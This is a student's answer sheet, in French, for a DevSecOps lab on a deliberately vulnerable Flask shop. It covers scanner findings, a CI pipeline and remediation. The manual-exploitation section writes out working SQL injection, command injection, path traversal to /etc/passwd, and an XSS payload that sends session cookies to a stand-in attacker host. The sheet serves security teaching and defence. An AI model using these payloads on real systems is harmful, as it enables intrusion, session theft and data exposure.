# Réponses TP DevSecOps — VulnShop

---

## Partie 1 — Mise en place de l'environnement

### Question 1.1 : Version de Trivy et base de CVE

**Réponse :**
Version utilisée : **Trivy 0.71.0** (via l'image Docker `aquasec/trivy`, vérifié avec `trivy --version`).

Trivy télécharge sa propre base de données de vulnérabilités, **`trivy-db`** (distribuée en tant qu'artefact OCI depuis `mirror.gcr.io/aquasec/trivy-db:2`, ~95 Mo). Cette base agrège plusieurs sources : **NVD** (National Vulnerability Database), les advisories des distributions (Debian, Alpine, RedHat…), **GitHub Security Advisories (GHSA)** et **OSV** (Open Source Vulnerabilities) pour les packages applicatifs (PyPI, npm…).

> Sur Windows, plutôt que d'installer le binaire, on utilise l'image Docker : `docker run --rm aquasec/trivy ...` (ce que nous avons fait dans ce TP).

---

## Partie 2 — Analyse statique avec Bandit

### Question 2.1 : Vulnérabilités HIGH détectées

**Bandit détecte 5 vulnérabilités de sévérité HIGH :**

| Test ID | Fichier:Ligne | Description |
|---------|--------------|-------------|
| B324    | app.py:52    | hashlib.md5 — hash MD5 faible (init_db) |
| B324    | app.py:65    | hashlib.md5 — hash MD5 faible (login) |
| B602    | app.py:98    | subprocess avec shell=True — injection de commande OS |
| B501    | app.py:144   | requests.get(verify=False) — vérification TLS désactivée |
| B201    | app.py:162   | Flask debug=True — debugger Werkzeug exposé |

### Question 2.2 : Identifiant Bandit pour subprocess avec shell=True

**Test ID : B602** (`subprocess_popen_with_shell_equals_true`)

**Pourquoi c'est dangereux :**
Avec `shell=True`, la commande est interprétée par le shell système (`/bin/sh` ou `cmd.exe`). Si l'entrée utilisateur est incluse sans sanitisation, un attaquant peut injecter des métacaractères shell (`;`, `|`, `&&`, etc.) pour exécuter des commandes arbitraires sur le serveur (OS Command Injection — CWE-78).

Exemple dans le code :
```python
# Ligne 98 — vulnérable
result = subprocess.check_output(f"ping -c 1 {host}", shell=True)
# Si host = "localhost; id", la commande devient : ping -c 1 localhost; id
```

### Question 2.3 : Algorithme de hachage pour les mots de passe (B324)

**MD5 ne doit jamais être utilisé pour stocker des mots de passe.**

L'algorithme recommandé est **bcrypt** (ou argon2, scrypt) car :
- Il est intentionnellement **lent** (facteur de coût configurable), ce qui rend les attaques brute-force coûteuses
- Il intègre un **sel (salt)** automatiquement, protégeant contre les rainbow tables
- Il est spécialement conçu pour le hachage de mots de passe

En Python :
```python
import bcrypt
pw_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt())
```

SHA-256 (`hashlib.sha256`) serait un palliatif minimal mais toujours insuffisant sans salt et itérations.

### Question 2.4 : Vulnérabilité B506 (yaml.load)

**Ligne de code :**
```python
# app.py ligne 135
config = yaml.load(config_data)
```

**Vulnérabilité :** `yaml.load()` sans paramètre `Loader=` peut instancier des objets Python arbitraires via des tags YAML spéciaux (`!!python/object/apply:os.system [...]`), permettant une **exécution de code arbitraire (RCE)**.

**Correction :**
```python
config = yaml.safe_load(config_data)
```
`yaml.safe_load()` ne charge que des types scalaires et collections Python sûrs.

### Question 2.5 : Pourquoi exclure B101 en TP mais pas en production ?

`B101` signale l'usage de `assert` pour des vérifications de sécurité ou de validation. En TP, les `assert` sont courants pour des tests rapides sans être des contrôles de sécurité réels.

En **production**, les assertions sont désactivées si Python est lancé avec le flag `-O` (optimisé), ce qui fait disparaître silencieusement toutes les vérifications `assert`. Un `assert user.is_admin()` deviendrait une no-op, ouvrant des failles d'autorisation.

---

## Partie 3 — Analyse avec Trivy

> Scans réalisés avec l'image Docker `aquasec/trivy` (DB CVE 2026-06). Résultats réels ci-dessous.
> Fichiers générés : `trivy-fs.json`, `trivy-image.json`, `trivy-config.json`.

**Synthèse :**
| Scan | CRITICAL | HIGH | MEDIUM | Total |
|------|----------|------|--------|-------|
| `trivy fs app/` (deps Python) | 5 | 30 | — | 35 |
| `trivy image vulnshop:tp` (image complète) | 10 | 59 | 92 | 161 |

### Question 3.1 : CVEs CRITICAL dans l'image Docker

L'image `vulnshop:tp` contient **10 CVEs CRITICAL**.

**Les 3 plus sévères (CVSS 9.8) :**

| CVE | Package | Version | Fix | CVSS | Description |
|-----|---------|---------|-----|------|-------------|
| CVE-2026-31789 | openssl / libssl3 | 3.5.1 | 3.5.5 | 9.8 | Heap buffer overflow OpenSSL (X.509) |
| CVE-2026-8376 | perl-base | 5.40.1 | N/A | 9.8 | Heap buffer overflow Perl (compilation regex) |
| CVE-2021-34552 | Pillow | 8.1.0 | 8.3.0 | 9.8 | Buffer overflow dans la fonction de conversion d'image |

> Note : plusieurs autres CVE sont aussi à 9.8 (CVE-2022-22817 Pillow ImageMath RCE, CVE-2021-25289 Pillow, CVE-2020-14343 PyYAML). La majorité des CVE applicatives proviennent des packages Python obsolètes (Pillow surtout), le reste de la couche système Debian de l'image de base.

### Question 3.2 : PyYAML et CVE associée

- **Version installée :** `PyYAML 5.3.1` (requirements.txt ligne 7) — **confirmé par Trivy**
- **CVE associée :** **CVE-2020-14343** (CRITICAL, CVSS **9.8**) — correction incomplète de CVE-2020-1747 : `yaml.load()` sans Loader permet l'instanciation d'objets arbitraires → exécution de code.
- **Version corrigeant la vulnérabilité :** **PyYAML 5.4** (selon Trivy : `fix 5.4`)

### Question 3.3 : Problèmes dans le Dockerfile

Trivy (`trivy config app/Dockerfile`) signale **2 mauvaises pratiques** :

| ID | Sévérité | Problème |
|----|----------|----------|
| **DS-0002** | HIGH | L'image tourne en tant que `root` (aucune directive `USER`) |
| **DS-0026** | LOW | Aucun `HEALTHCHECK` défini |

**Dockerfile corrigé :**
```dockerfile
FROM python:3.9-slim

WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY app.py .

# DS-0002 : créer et utiliser un utilisateur non-root
RUN adduser --disabled-password --gecos '' appuser
USER appuser

EXPOSE 5000

# DS-0026 : ajouter un HEALTHCHECK
HEALTHCHECK --interval=30s --timeout=3s \
  CMD python -c "import urllib.request; urllib.request.urlopen('http://localhost:5000/debug')" || exit 1

CMD ["python", "app.py"]
```

> Pour réduire aussi les CVE applicatives, il faudrait mettre à jour les versions dans `requirements.txt` (Pillow ≥ 10.3, PyYAML ≥ 5.4, cryptography ≥ 42, urllib3 ≥ 2.x, Flask/Werkzeug ≥ 2.3).

### Question 3.4 : Différence trivy fs vs trivy image

| Commande | Cible | Usage en CI |
|----------|-------|-------------|
| `trivy fs` | Fichiers sources du projet (requirements.txt, package.json…) | Avant le build — détecte les dépendances vulnérables dès le code source |
| `trivy image` | Image Docker complète (OS + packages système + dépendances) | Après le build — détecte toutes les couches, y compris les packages système de l'image de base |

**En pipeline CI :** `trivy fs` dans le stage `sast` (rapide), `trivy image` dans le stage `scan-image` après le build.

---

## Partie 4 — SonarQube

> Analyse réalisée avec SonarQube 26.6 via `sonar-scanner-cli` (Docker). Résultats réels ci-dessous.

**Résumé de l'analyse :**
| Métrique | Valeur |
|----------|--------|
| Vulnerabilities | 3 |
| Security Hotspots | 4 |
| Bugs | 0 |
| Code Smells | 6 |
| Reliability Rating | A (1.0) |
| Security Rating | E (5.0) |
| Lignes de code | 113 |

### Question 4.1 : Security Hotspots et recoupement avec Bandit

**SonarQube identifie 4 Security Hotspots :**

| Probabilité | Catégorie | Ligne | Message | Recoupement Bandit |
|-------------|-----------|-------|---------|--------------------|
| HIGH | csrf | 17 | Disabling CSRF protection (Flask) | — (Bandit ne teste pas le CSRF) |
| MEDIUM | permission | 1 (Dockerfile) | L'image python tourne en root | — |
| LOW | others | 52 | Hashing data (MD5) | **B324** (hashlib MD5) |
| LOW | others | 65 | Hashing data (MD5) | **B324** (hashlib MD5) |

**Recoupements :** les 2 hotspots sur le hachage MD5 (lignes 52 et 65) correspondent exactement aux détections **B324** de Bandit. Les autres (CSRF, root user) sont propres à SonarQube car Bandit ne couvre pas ces aspects.

### Question 4.2 : Bug vs Vulnerability vs Security Hotspot

| Type | Définition |
|------|-----------|
| **Bug** | Comportement incorrect du code susceptible de provoquer une erreur à l'exécution (ex : NullPointerException, logique incorrecte). N'est **pas** lié à la sécurité. |
| **Vulnerability** | Faille de sécurité **confirmée** par SonarQube, exploitable, à corriger en priorité (ex : clé secrète divulguée). |
| **Security Hotspot** | Code **potentiellement** dangereux qui **nécessite une revue humaine** — peut être un vrai problème ou un faux positif selon le contexte (ex : usage de MD5, qui peut être légitime pour un checksum non-sécurité). |

**Sur ce projet, les 3 Vulnerabilities détectées sont :**
- Ligne 20 (BLOCKER) — `python:S6779` : clé secrète Flask hardcodée
- Ligne 22 (MAJOR) — `python:S2068` : mot de passe hardcodé (`DB_PASSWORD`)
- Ligne 162 (BLOCKER) — `python:S8392` : binding sur toutes les interfaces (`0.0.0.0`)

### Question 4.3 : Note de fiabilité (Reliability Rating)

**Reliability Rating = A (1.0)** — car SonarQube ne détecte **aucun Bug** (0 bug). Le Reliability Rating ne concerne que les *bugs*, pas la sécurité.

> Attention à ne pas confondre : c'est le **Security Rating** qui est mauvais (**E / 5.0**) à cause des 3 vulnérabilités. Le Reliability Rating, lui, est déjà en A.

Pour **maintenir le A en fiabilité**, il suffit qu'aucun bug ne soit introduit. Si on voulait améliorer le **Security Rating** (passer de E à A), il faudrait corriger les 3 vulnérabilités : retirer la clé secrète et le mot de passe hardcodés, et binder l'app sur une interface spécifique plutôt que `0.0.0.0`.

---

## Partie 5 — Exploitation manuelle avec Burp Suite

> **Note :** Ces tests nécessitent que l'application soit démarrée (`docker compose -f ci/docker-compose.yml up -d vulnshop-app`)

### Question 5.1 : Injection SQL sur /login

**La requête `admin'--` connecte-t-elle ?**

**OUI** — testé et confirmé. Réponse obtenue :
```json
{"role":"admin","status":"ok","user":"admin'--"}
```

La requête SQL construite devient :
```sql
SELECT * FROM users WHERE username = 'admin'--' AND password = '<hash>'
```
Le `--` commente le reste : la vérification du mot de passe est totalement ignorée. L'attaquant est connecté en tant qu'`admin` sans connaître son mot de passe.

### Question 5.2 : Payload SQLi pour récupérer tous les utilisateurs

```
username = ' OR 1=1--
password = anything
```

**Testé et confirmé :**
```json
{"role":"admin","status":"ok","user":"' OR 1=1--"}
```

Requête résultante :
```sql
SELECT * FROM users WHERE username = '' OR 1=1--' AND password = '...'
```
`OR 1=1` étant toujours vrai, le premier utilisateur (admin) est retourné sans aucun mot de passe.

### Question 5.3 : XSS reflété sur /search

**L'alerte s'affiche** — testé et confirmé. La réponse HTML contient literalement :
```html
<h1>Résultats pour : <script>alert('XSS')</script></h1>
```
Le paramètre `q` est injecté directement dans le template Jinja2 via f-string sans aucun échappement.

**Payload pour exfiltrer le cookie de session :**
```
http://localhost:5000/search?q=<script>document.location='http://attaquant.com/steal?c='+document.cookie</script>
```

### Question 5.4 : Injection de commande OS sur /ping

**Résultat de `curl "http://localhost:5000/ping?host=localhost;id"` — testé et confirmé :**
```
uid=0(root) gid=0(root) groups=0(root)
```
Le container tourne en root. La commande `ping -c 1 localhost; id` est exécutée par le shell, et `id` retourne l'identité du processus.

**Payload pour afficher /etc/passwd — testé et confirmé :**
```
curl "http://localhost:5000/ping?host=localhost;cat%20/etc/passwd"
```

---

### Bonus — Path Traversal sur /download (VULN-07)

Le code utilise `os.path.join("/var/www/uploads", filename)`. En Python, si `filename` est un chemin **absolu**, `os.path.join` **ignore** le préfixe et retourne directement le chemin absolu :
```python
os.path.join("/var/www/uploads", "/etc/passwd")  # → "/etc/passwd"
```

**Payload fonctionnel (testé et confirmé) :**
```
curl "http://localhost:5000/download?file=/etc/passwd"
```
**Résultat :** contenu complet de `/etc/passwd` retourné (root, daemon, bin…).

Note : le payload classique `../../etc/passwd` échoue car `/var/www/uploads` n'existe pas dans le container — la traversée de répertoires ne peut pas remonter depuis un dossier inexistant.

---

## Partie 6 — Pipeline GitLab CI

### Question 6.1 : Jobs en parallèle

Les jobs **flake8-lint**, **bandit-sast**, **sonarqube-sast** et **pip-audit** s'exécutent en parallèle car ils sont dans le même stage (`lint`/`sast`) et n'ont pas de dépendances (`needs`) entre eux. GitLab CI exécute tous les jobs d'un même stage simultanément si les runners sont disponibles.

### Question 6.2 : Suppression de `needs: [build-image]`

Sans cette dépendance, `trivy-image-scan` essaierait de scanner l'image **avant** qu'elle soit construite et poussée dans le registry. Le job échouerait avec une erreur "image not found". La directive `needs` crée une dépendance de **DAG** (Directed Acyclic Graph) qui force l'ordre d'exécution.

### Question 6.3 : allow_failure: true

`allow_failure: true` signifie que même si le job échoue (vulnérabilités trouvées), le pipeline **continue** et est marqué comme réussi avec un avertissement.

**En production :**
- **bandit-sast** : passer à `allow_failure: false` pour bloquer sur les HIGH
- **trivy-image-scan** : passer à `allow_failure: false` pour bloquer sur les CRITICAL
- **sonarqube-sast** : peut rester en `allow_failure: true` si SonarQube n'est pas toujours disponible, ou passer à `false` avec Quality Gate configurée

---

## Partie 7 — Remédiation

Objectif : corriger les vulnérabilités pour que les **quality gates du pipeline passent au vert**
(Bandit 0 HIGH, Trivy 0 CVE CRITICAL fixable). Vérifié en local avant push.

### Corrections dans `app/app.py`

| Vuln | Ancienne ligne | Nouvelle ligne | Bandit ID |
|------|---------------|----------------|-----------|
| YAML non sécurisé | `yaml.load(config_data)` | `yaml.safe_load(config_data)` | B506 |
| Flask debug en production | `app.run(debug=True, ...)` | `app.run(debug=False, ...)` | B201 |
| Vérification TLS désactivée | `requests.get(url, verify=False)` | `requests.get(url, verify=True)` | B501 |
| MD5 (seed admin) | `hashlib.md5(b"admin123").hexdigest()` | `bcrypt.hashpw(b"admin123", bcrypt.gensalt())` | B324 |
| MD5 (login) | `hashlib.md5(password.encode())...` | `bcrypt.checkpw(password.encode(), user[2].encode())` | B324 |
| Injection commande OS | `subprocess.check_output(f"ping -c 1 {host}", shell=True)` | `subprocess.check_output(["ping", "-c", "1", host])` | B602 |
| Injection SQL (bonus) | `f"... WHERE username = '{username}' ..."` | `conn.execute("... WHERE username = ?", (username,))` | B608 |

### Corrections des dépendances (`app/requirements.txt`)

Versions montées vers des releases patchées pour supprimer les CVE Trivy CRITICAL/HIGH :
`Flask 2.0.1→3.0.3`, `Werkzeug 2.0.1→3.0.6`, `requests 2.25.0→2.32.3`,
`PyYAML 5.3.1→6.0.2`, `Jinja2 3.0.1→3.1.4`, `cryptography 3.2.1→43.0.3`,
`Pillow 8.1.0→10.4.0`, `urllib3 1.26.4→2.2.3` (+ `bcrypt 4.2.1` ajouté).

### Corrections du `Dockerfile`

- `RUN apt-get update && apt-get upgrade -y` : patche les CVE système (OpenSSL CVE-2026-31789, etc.)
- `USER appuser` : conteneur non-root (corrige Trivy config **DS-0002**)
- `HEALTHCHECK` ajouté (corrige Trivy config **DS-0026**)

### Question 7.1 : Impact des corrections sur Bandit et SonarQube

Oui, le nombre d'issues Bandit **diminue immédiatement**. Résultat vérifié en local :
- Avant : 5 HIGH (B324 ×2, B602, B501, B201)
- Après : **0 HIGH** → le gate `bandit --severity-level high` sort en code 0 (job vert).
- Le gate Trivy CRITICAL (`--ignore-unfixed --exit-code 1`) sort aussi en code 0 : **0 CVE CRITICAL fixable**.

SonarQube **ne reflète pas les changements immédiatement** : il faut relancer `sonar-scanner`
(ou pousser pour déclencher le pipeline). C'est une analyse à la demande, pas en temps réel.

### Résultat attendu du pipeline après remédiation

| Job | Avant | Après |
|-----|-------|-------|
| bandit-sast | 🔴 (5 HIGH) | 🟢 (0 HIGH) |
| trivy-image-scan | 🔴 (CVE CRITICAL) | 🟢 (0 CRITICAL fixable) |
| Tous les autres | 🟢 | 🟢 |

→ Pipeline **entièrement vert** : c'est la capture d'écran du rendu n°5.
